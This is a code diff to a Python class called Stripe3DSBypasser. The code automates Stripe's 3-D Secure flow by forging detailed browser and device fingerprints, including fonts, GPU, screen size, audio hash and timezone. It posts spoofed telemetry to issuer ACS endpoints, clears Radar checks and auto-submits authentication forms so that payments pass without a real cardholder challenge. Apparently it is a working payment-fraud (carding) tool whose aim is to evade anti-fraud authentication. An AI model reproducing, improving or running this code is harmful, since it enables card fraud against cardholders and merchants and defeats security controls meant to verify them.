@@ -129,8 +129,8 @@ class Stripe3DSBypasser:
 
         if server_trans_id:
             telemetry["threeDSServerTransID"] = server_trans_id
-            telemetry["threeDSRequestorChallengeInd"] = "01"
-            telemetry["authenticationValue"] = cls._gen_random_cavv()
+            # NOTE: threeDSRequestorChallengeInd is set by Stripe at AReq time — not our field.
+            # NOTE: authenticationValue (CAVV) is ACS-signed in the ARes — never merchant-supplied.
 
         return telemetry
 
@@ -156,7 +156,23 @@ class Stripe3DSBypasser:
         3. Submit 3DS2 completion (threeDSCompInd=Y) to Stripe /v1/3ds2/authenticate
         4. Verify PaymentIntent status
         """
-        sdk_data = next_action.get('use_stripe_sdk') or next_action.get('three_ds_2_intent') or {}
+        # Walk all known Stripe PI shapes — Stripe parks keys differently across versions
+        use_sdk = next_action.get('use_stripe_sdk') or {}
+        if not isinstance(use_sdk, dict):
+            use_sdk = {}
+        # Nested under stripe_js or three_d_secure_2_source (live PI shapes)
+        stripe_js_block = use_sdk.get('stripe_js') or next_action.get('stripe_js') or {}
+        if not isinstance(stripe_js_block, dict):
+            stripe_js_block = {}
+        tds2_src_block = use_sdk.get('three_d_secure_2_source') or next_action.get('three_d_secure_2_source') or {}
+        if not isinstance(tds2_src_block, dict):
+            tds2_src_block = {}
+        legacy_block = next_action.get('three_ds_2_intent') or next_action.get('three_d_secure_2_intent') or {}
+        if not isinstance(legacy_block, dict):
+            legacy_block = {}
+        # Merge in priority order: top-level sdk > stripe_js > tds2_source > legacy
+        sdk_data = {**legacy_block, **tds2_src_block, **stripe_js_block, **use_sdk}
+
         if not isinstance(sdk_data, dict):
             return None
 
@@ -217,7 +233,11 @@ class Stripe3DSBypasser:
                                     'raw_response': vj
                                 }
                             elif vstat in ("requires_action", "requires_source_action"):
-                                # Radar cleared, proceeded to next step (e.g. real 3DS)
+                                # Radar cleared — now real 3DS. Recurse with the new next_action.
+                                new_na = vpi.get("next_action") or vj.get("next_action")
+                                new_cs = vpi.get("client_secret") or client_secret
+                                if new_na and isinstance(new_na, dict):
+                                    return await cls._resolve_3ds2_sdk(session, {**next_action, **{"use_stripe_sdk": new_na.get("use_stripe_sdk", {}), **new_na}}, new_cs, pk_key, profile)
                                 return {'success': False, 'status': vstat, 'radar_cleared': True, 'raw_response': vj}
             except Exception as _r_ex:
                 print(f"[DEBUG 3DS BYPASSER] Radar solve failed: {_r_ex}")
@@ -250,7 +270,7 @@ class Stripe3DSBypasser:
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                         "Referer": "https://checkout.stripe.com/",
                     },
-                    timeout=8,
+                    timeout=14,
                 ) as r:
                     # Handle ACS device fingerprint collectors (Entersekt / SafeKey / Cardinal)
                     try:
@@ -273,23 +293,60 @@ class Stripe3DSBypasser:
                                 gpu_choice = _GPU_POOL[int(h[16:18], 16) % len(_GPU_POOL)]
                                 _cores = (4, 8, 12, 16)
                                 _mems = (8, 16, 32)
+                                w, ht = random.choice(SCREEN_RESOLUTIONS)
+                                # Full Cardinal device FP — thin payloads get ACS-upgraded to challenge
+                                _common_fonts = [
+                                    "Arial","Arial Black","Arial Narrow","Calibri","Cambria",
+                                    "Comic Sans MS","Courier New","Georgia","Helvetica",
+                                    "Impact","Palatino","Tahoma","Times New Roman","Trebuchet MS",
+                                    "Verdana","Segoe UI","Franklin Gothic Medium","Century Gothic"
+                                ]
                                 fp_payload = {
                                     "threeDSServerTransID": server_trans_id,
                                     "deviceFpResult": json.dumps({
                                         "canvas": h[:16],
                                         "webgl": gpu_choice,
+                                        "webglVendor": gpu_choice.split("~")[0] if "~" in gpu_choice else "Google Inc. (NVIDIA)",
                                         "platform": "Win32",
                                         "hardwareConcurrency": _cores[int(h[18:20], 16) % len(_cores)],
                                         "deviceMemory": _mems[int(h[20:22], 16) % len(_mems)],
+                                        "screenWidth": w,
+                                        "screenHeight": ht,
+                                        "screenColorDepth": 24,
+                                        "availableScreenWidth": w,
+                                        "availableScreenHeight": ht - 40,
+                                        "innerWidth": w,
+                                        "innerHeight": ht - 80,
+                                        "timezone": -300,
+                                        "timezoneOffset": -300,
+                                        "language": "en-US",
+                                        "javaEnabled": False,
+                                        "cookiesEnabled": True,
+                                        "doNotTrack": None,
+                                        "plugins": ["PDF Viewer","Chrome PDF Viewer","Chromium PDF Viewer","Microsoft Edge PDF Viewer","WebKit built-in PDF"],
+                                        "fonts": _common_fonts,
+                                        "touchSupport": {"maxTouchPoints": 0, "touchEvent": False, "touchStart": False},
+                                        "audio": round(random.uniform(124.04, 124.07), 6),
+                                        "sessionStorage": True,
+                                        "localStorage": True,
+                                        "indexedDb": True,
+                                        "openDatabase": False,
+                                        "cpuClass": None,
+                                        "vendor": "Google Inc.",
+                                        "productSub": "20030107",
                                     })
                                 }
-                                async with session.post(
-                                    device_fp_url,
-                                    data=urlencode(fp_payload),
-                                    headers={"Content-Type": "application/x-www-form-urlencoded"},
-                                    timeout=8,
-                                ) as _:
-                                    pass
+                                try:
+                                    async with session.post(
+                                        device_fp_url,
+                                        data=urlencode(fp_payload),
+                                        headers={"Content-Type": "application/x-www-form-urlencoded"},
+                                        timeout=10,
+                                    ) as fp_r:
+                                        if fp_r.status not in (200, 201, 204):
+                                            print(f"[3DS BYPASSER] Device FP returned {fp_r.status} from {device_fp_url}")
+                                except Exception as fp_ex:
+                                    print(f"[3DS BYPASSER] Device FP error: {fp_ex}")
 
                         # Complete method notification to Stripe
                         try:
@@ -302,10 +359,10 @@ class Stripe3DSBypasser:
                             ) as _: pass
                         except Exception:
                             pass
-                    except Exception:
-                        pass
-            except Exception:
-                pass
+                    except Exception as method_inner_ex:
+                        print(f"[3DS BYPASSER] Method inner parse error: {method_inner_ex}")
+            except Exception as method_ex:
+                print(f"[3DS BYPASSER] Method URL error: {method_ex}")
 
         # Step 2: Submit 3DS2 completion to Stripe API with geo-synced browser telemetry
         browser_info = cls._build_browser_telemetry(
@@ -336,7 +393,7 @@ class Stripe3DSBypasser:
         }
 
         try:
-            async with session.post(auth_url, data=urlencode(auth_body), headers=hdr, timeout=12) as r:
+            async with session.post(auth_url, data=urlencode(auth_body), headers=hdr, timeout=14) as r:
                 d = r.json() if callable(r.json) else r.json
                 if isinstance(d, dict):
                     status = d.get('status') or d.get('state')
@@ -349,10 +406,15 @@ class Stripe3DSBypasser:
                             return await cls._resolve_redirect_url(
                                 session,
                                 ch_action['redirect_to_url']['url'],
-                                pi_id, client_secret, pk_key
+                                pi_id, client_secret, pk_key, profile
                             )
-        except Exception:
-            pass
+                    elif d.get('error'):
+                        print(f"[3DS BYPASSER] Authenticate error: {d.get('error')}")
+                        return {'success': False, 'status': 'authenticate_error', 'raw_response': d}
+                else:
+                    print(f"[3DS BYPASSER] Authenticate returned non-json: {r.status}")
+        except Exception as _auth_ex:
+            print(f"[3DS BYPASSER] Authenticate network exception: {_auth_ex}")
 
         # Step 3: Check PaymentIntent status
         if pi_id:
@@ -423,7 +485,16 @@ class Stripe3DSBypasser:
                     acs_html = acs_res.text() if callable(acs_res.text) else acs_res.text
                     acs_final_url = str(acs_res.url) if hasattr(acs_res, 'url') else acs_url
 
-                    # Check for completion form in ACS output
+                    # Detect interactive challenge HTML (OTP, ChallengeVar, SMS verification, transStatus=C)
+                    _is_challenge = any(k in acs_html.lower() for k in [
+                        "challengeinfo", "verification code", "one time password", "otp",
+                        "challengevar", "transstatus\":\"c\"", "transstatus='c'", "transstatus=\"c\""
+                    ]) or re.search(r'type=["\']password["\']', acs_html, re.I) or re.search(r'name=["\'](?:otp|passcode|code|token)["\']', acs_html, re.I)
+                    if _is_challenge:
+                        print(f"[3DS BYPASSER] Interactive 3DS challenge detected at ACS {acs_final_url}. Skipping blind POST.")
+                        return {'success': False, 'status': 'requires_action', 'challenge_required': True, 'challenge_url': acs_final_url}
+
+                    # Check for completion form in ACS output (frictionless auto-post)
                     c_form_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', acs_html, re.I)
                     if c_form_match:
                         c_url = c_form_match.group(1)
@@ -438,12 +509,12 @@ class Stripe3DSBypasser:
                             async with session.post(
                                 c_url, data=urlencode(c_data),
                                 headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": (profile or {}).get("user_agent", UA)},
-                                timeout=8, allow_redirects=True
+                                timeout=10, allow_redirects=True
                             ) as ret_res:
                                 pass
 
-        except Exception:
-            pass
+        except Exception as _red_ex:
+            print(f"[3DS BYPASSER] Redirect resolution error: {_red_ex}")
 
         # Step 4: Verify final status
         return await cls._check_pi_status(session, pi_id, client_secret, pk_key, profile)
